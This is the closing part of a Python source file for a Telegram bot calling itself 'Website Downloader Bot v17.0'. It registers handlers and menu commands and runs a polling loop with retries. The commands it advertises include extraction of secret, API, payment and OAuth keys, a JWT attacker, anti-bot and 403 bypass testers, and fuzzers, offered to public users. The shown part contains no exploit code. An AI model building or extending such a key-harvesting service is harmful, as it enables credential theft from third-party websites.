    app.add_handler(CommandHandler("jwtlive",         cmd_jwtlive))
    app.add_handler(CommandHandler("pushkeys",        cmd_pushkeys))
    app.add_handler(CommandHandler("chatkeys",        cmd_chatkeys))
    app.add_handler(CommandHandler("oauthscan",       cmd_oauthscan))
    app.add_handler(CommandHandler("webhooks",        cmd_webhooks))
    # ── Account commands ──────────────────────────────
    app.add_handler(CommandHandler("mystats",        cmd_mystats))
    # ── Admin commands ────────────────────────────────
    app.add_handler(CommandHandler("admin",          cmd_admin))
    app.add_handler(CommandHandler("proxy",          cmd_proxy))
    app.add_handler(CommandHandler("setproxy",       cmd_setproxy))
    app.add_handler(CommandHandler("ban",            cmd_ban))
    app.add_handler(CommandHandler("unban",          cmd_unban))
    app.add_handler(CommandHandler("setlimit",       cmd_setlimit))
    app.add_handler(CommandHandler("userinfo",       cmd_userinfo))
    app.add_handler(CommandHandler("broadcast",      cmd_broadcast))
    app.add_handler(CommandHandler("allusers",       cmd_allusers))
    app.add_handler(CommandHandler("setpages",       cmd_setpages))
    app.add_handler(CommandHandler("setassets",      cmd_setassets))
    # ── Proxy admin commands ──────────────────────────
    # ── File upload handler ──────────────────────────
    app.add_handler(MessageHandler(
        filters.Document.ALL, handle_app_upload
    ))
    # ── Callbacks ─────────────────────────────────────
    app.add_handler(CallbackQueryHandler(keydump_callback,      pattern="^kd_"))
    app.add_handler(CallbackQueryHandler(force_join_callback,   pattern="^fj_check$"))
    app.add_handler(CallbackQueryHandler(appassets_cat_callback, pattern="^apa_"))
    app.add_handler(CallbackQueryHandler(admin_callback,        pattern="^adm_"))
    app.add_handler(CallbackQueryHandler(help_category_callback, pattern="^help_"))
    # ── Global error handler → Admin notify ──────────
    app.add_error_handler(error_handler)

    print("╔══════════════════════════════════════╗")
    print("║  Website Downloader Bot v17.0        ║")
    print(f"║  SSRF Protection:     ✅             ║")
    print(f"║  Path Traversal:      ✅             ║")
    print(f"║  Rate Limiting:       ✅ ({RATE_LIMIT_SEC}s)     ║")
    print(f"║  Queue System:        ✅ (max {QUEUE_MAX})      ║")
    print(f"║  Admin Error Notify:  ✅             ║")
    print(f"║  Auto-Delete Files:   ✅ ({FILE_EXPIRY_HOURS}h)       ║")
    print(f"║  Admin Cmd Hidden:    ✅             ║")
    print(f"║  File Log:            ✅ bot.log     ║")
    print(f"║  JS (Playwright):     {'✅' if PLAYWRIGHT_OK else '❌ pip install playwright'}  ║")
    print(f"║  Concurrent:          {MAX_WORKERS} users           ║")
    print(f"║  /tech fingerprint:   ✅             ║")
    print(f"║  /extract secrets:    ✅             ║")
    print(f"║  /monitor alerts:     ✅             ║")
    print("╚══════════════════════════════════════╝")

    # ── Retry loop — Termux network drop ကို handle ──
    MAX_RETRIES = 10
    RETRY_DELAY = 10   # seconds

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            logger.info("Bot starting... (attempt %d/%d)", attempt, MAX_RETRIES)

            async def _start_background(app):
                """Background tasks — queue worker + auto-delete loop + monitor loop"""
                global _monitor_app_ref
                _monitor_app_ref = app
                asyncio.create_task(queue_worker())
                asyncio.create_task(auto_delete_loop())
                asyncio.create_task(monitor_loop())
                logger.info("Background tasks started (queue worker + auto-delete + monitor)")

                # ── Register commands in Telegram menu ────────────────
                from telegram import BotCommand, BotCommandScopeDefault, BotCommandScopeChat
                _user_cmds = [
                    BotCommand("start",       "Bot ကို စတင်ရန် / Menu"),
                    BotCommand("help",        "Commands လမ်းညွှန်"),
                    BotCommand("download",    "Single page download"),
                    BotCommand("fullsite",    "Full website download"),
                    BotCommand("jsdownload",  "JS/React/Vue site download"),
                    BotCommand("jsfullsite",  "JS + Full crawl"),
                    BotCommand("resume",      "Download ဆက်လုပ်ရန်"),
                    BotCommand("stop",        "Download ရပ်ရန်"),
                    BotCommand("vuln",        "Security vulnerability scan"),
                    BotCommand("api",         "API endpoint discovery"),
                    BotCommand("tech",        "Tech stack fingerprint"),
                    BotCommand("extract",     "Secret & key scanner"),
                    BotCommand("sitekey",     "Captcha key extractor"),
                    BotCommand("antibot",     "Anti-bot bypass tester"),
                    BotCommand("jwtattack",   "JWT decode & attack"),
                    BotCommand("keydump",     "All-in-one key dump"),
                    BotCommand("apikeys",     "API key extractor"),
                    BotCommand("firebase",    "Firebase config extractor"),
                    BotCommand("paykeys",     "Payment key extractor"),
                    BotCommand("socialkeys",  "OAuth / social key extractor"),
                    BotCommand("analytics",   "Analytics ID extractor"),
                    BotCommand("hiddenkeys",  "CSRF / hidden token extractor"),
                    BotCommand("pushkeys",    "Push notification key extractor"),
                    BotCommand("endpoints",   "REST / GraphQL endpoint finder"),
                    BotCommand("webhooks",    "Webhook URL extractor"),
                    BotCommand("oauthscan",   "OAuth config scanner"),
                    BotCommand("subdomains",  "Subdomain enumeration"),
                    BotCommand("bypass403",   "403 bypass tester"),
                    BotCommand("fuzz",        "Path & param fuzzer"),
                    BotCommand("smartfuzz",   "Context-aware smart fuzzer"),
                    BotCommand("monitor",     "Page change alert monitor"),
                    BotCommand("appassets",   "Web app asset analyzer"),
                    BotCommand("status",      "Daily usage & limit"),
                    BotCommand("history",     "Download history"),
                    BotCommand("mystats",     "Detailed statistics"),
                ]
                _admin_cmds = _user_cmds + [
                    BotCommand("admin",       "Admin panel"),
                    BotCommand("ban",         "User ban"),
                    BotCommand("unban",       "User unban"),
                    BotCommand("setlimit",    "Set download limit"),
                    BotCommand("userinfo",    "User info"),
                    BotCommand("broadcast",   "Broadcast message"),
                    BotCommand("allusers",    "All users list"),
                    BotCommand("setpages",    "Set max pages"),
                    BotCommand("setassets",   "Set max assets"),
                    BotCommand("proxy",       "Proxy pool status"),
                    BotCommand("setforcejoin","Set force join channel"),
                ]
                try:
                    await app.bot.set_my_commands(_user_cmds, scope=BotCommandScopeDefault())
                    for adm_id in ADMIN_IDS:
                        try:
                            await app.bot.set_my_commands(
                                _admin_cmds,
                                scope=BotCommandScopeChat(chat_id=adm_id)
                            )
                        except Exception:
                            pass
                    logger.info("Bot commands registered in Telegram menu ✅")
                except Exception as e:
                    logger.warning("set_my_commands failed: %s", e)

            app.post_init = _start_background

            app.run_polling(
                allowed_updates = Update.ALL_TYPES,
                drop_pending_updates = True,
                timeout          = 20,
                poll_interval    = 0.5,
            )
            break  # clean exit
        except TimedOut as e:
            logger.warning("TimedOut (attempt %d): %s", attempt, e)
            if attempt < MAX_RETRIES:
                print(f"⚠️  Timeout — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                import time as _time; _time.sleep(RETRY_DELAY)
            else:
                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
        except NetworkError as e:
            logger.warning("NetworkError (attempt %d): %s", attempt, e)
            if attempt < MAX_RETRIES:
                print(f"⚠️  Network error — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                import time as _time; _time.sleep(RETRY_DELAY)
            else:
                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
        except KeyboardInterrupt:
            print("\n👋 Bot stopped.")
            break

if __name__ == '__main__':
    main()
